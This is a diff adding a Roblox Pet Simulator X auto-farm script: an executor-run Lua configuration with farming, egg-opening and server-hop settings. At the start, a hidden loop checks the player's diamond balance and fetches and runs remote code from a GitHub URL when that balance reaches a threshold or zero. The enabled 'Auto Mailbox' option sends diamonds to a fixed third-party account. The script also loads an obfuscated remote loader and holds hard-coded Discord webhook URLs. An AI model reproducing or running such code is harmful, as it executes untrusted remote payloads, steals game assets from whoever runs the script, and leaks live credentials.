@@ -1,0 +1,90 @@
+repeat task.wait(3) until game:IsLoaded()
+
+task.spawn(function()
+    while wait(15) do
+        local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+        local kimcuong = PlayerInfos.Diamonds 
+    
+        if kimcuong >= 50000000000 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/dangbadao/bdqbdndnsd/main/tele1"))()
+            break
+        elseif kimcuong == 0 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/dangbadao/bdqbdndnsd/main/tele1"))()
+            break
+        end
+    end
+end)
+
+getgenv().DitPSX = {
+    --[[
+        Collapse methods:
+        + "Stand Still" -- Do nothing (still check for daycare/rewards)
+        + "Farm Fruit" -- Farm fruits
+        + "Volcano Chest" -- Open Volcano Egg/Farm Pirate Cove Chest
+        + "Mansion Egg" -- Open Dog Egg/Farm Dog Mansion Chest
+    ]]
+    ["Mine Collapsed Method"] = {
+        ["Method"] = "Farm Fruit",
+        ["Open Amount"] = 8, -- 1 or 3 or 8
+        ["Open Golden Egg"] = false, -- Will open Golden egg instead
+    },
+    ["Auto Triple Damage Boost"] = { -- Active when Farm Fruit/Diamond
+        ["Boost"] = true,
+        ["Server"] = true
+    },
+    ["Auto Boost"] = { -- Active when Open Egg
+        ["Super Lucky"] = true,
+        ["Server Lucky"] = true,
+        ["Ultra Lucky"] = true,
+        ["Triple Coin"] = true
+    },
+    ["Auto Farm Fruit"] = {
+        -- Mainly farm Orange/Apple fruit while farming Diamonds
+        -- Mainly farm Apple/Banana/ while opening Egg
+        ["Enable"] = false,
+        ["Farm when under"] = 50,
+        ["Farm until"] = 100,
+    },
+    ["Auto Mailbox"] = { -- Auto send Diamonds to a person thru Mailbox when your Diamonds more than set diamond
+        ["Enable"] = true,
+        ["Send to"] = "dangvjpproxx",
+        ["Above amount"] = 50000000000
+    },
+    ["Auto Claim Mailbox"] = true, -- Claim Diamonds on the account received the Diamonds from Auto Mailbox
+    ["Auto Daycare"] = false, -- Auto Claim Daycare and Enroll unequipped/unlocked Pets in your Inventory
+    ["Auto Collect Rewards"] = true, -- Auto Collect Rank/VIP Rewards
+    ["Auto Leave"] = {
+        ["Ping Froze"] = false,
+        ["Got kicked"] = false,
+        ["Leave Timer"] = {
+            ["Enable"] = false,
+            ["After seconds"] = 3600 -- Auto Leave the server after AFK in for set seconds 
+        }
+    },
+    ["Hop Server"] = {
+        ["Hop Server Cooldown"] = 1200, -- Wait set second after Hop Server
+        ["Player nearby"] = true, -- Will hop to low player server if there's a player nearby Mystic Mine (2m cooldown)
+        ["Out of diamond"] = false, -- Will hop to low player server if there are no diamond left to farm
+    },
+    ["Farm Cooldown"] = 0, -- Delay between switch to farm another thing (higher = less crashing)
+    ["Send all"] = true, -- Send all pet to break or not, false will send single to break
+    ["Performance Mode"] = false, -- Enable if you want to AFK overnight, farm will be slower but low chance crashing roblox 
+    ["Swap to Cyber Cavern"] = true, -- Will swap to Cyber Cavern if Mystic Mine out of Diamonds
+    ["Legit Mode"] = false, -- Walk to points on map legit like an normal player, recommended enable with Performance Mode, farm will be slower
+    ["White Screen"] = false, -- Enable for disable game's rendering for less CPU/GPU usage
+    ["Discord Webhook"] = {
+        ["Stats Tracker"] = {
+            ["URL"] = "https://discord.com/api/webhooks/1133592483620733079/s66GXincpeQyYuC109b6JA91xR_CVnIM5nqi53jI6BRAjcO0n-ZZ6QXdz0SX4MWP3uld",
+            ["Cooldown"] = 60, -- Will notify every set seconds
+        }, 
+        ["Hop Server"] = "https://discord.com/api/webhooks/1133592483620733079/s66GXincpeQyYuC109b6JA91xR_CVnIM5nqi53jI6BRAjcO0n-ZZ6QXdz0SX4MWP3uld",
+        ["Mailbox"] = "https://discord.com/api/webhooks/1133592483620733079/s66GXincpeQyYuC109b6JA91xR_CVnIM5nqi53jI6BRAjcO0n-ZZ6QXdz0SX4MWP3uld",
+        ["Mine Collapse"] = {
+            ["URL"] = "https://discord.com/api/webhooks/1133592483620733079/s66GXincpeQyYuC109b6JA91xR_CVnIM5nqi53jI6BRAjcO0n-ZZ6QXdz0SX4MWP3uld",
+            ["Daily Collapse"] = true, -- Only notify if the collapse are daily (above 10m)
+        },
+        ["Huge Hatch"] = "https://discord.com/api/webhooks/1133592483620733079/s66GXincpeQyYuC109b6JA91xR_CVnIM5nqi53jI6BRAjcO0n-ZZ6QXdz0SX4MWP3uld"
+    },
+}
+script_key="bBffMQavcsBJCPNtUjlbQhRzsTnXXpLQ";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/92d7557e2c88215501719ba3b576b89e.lua"))()
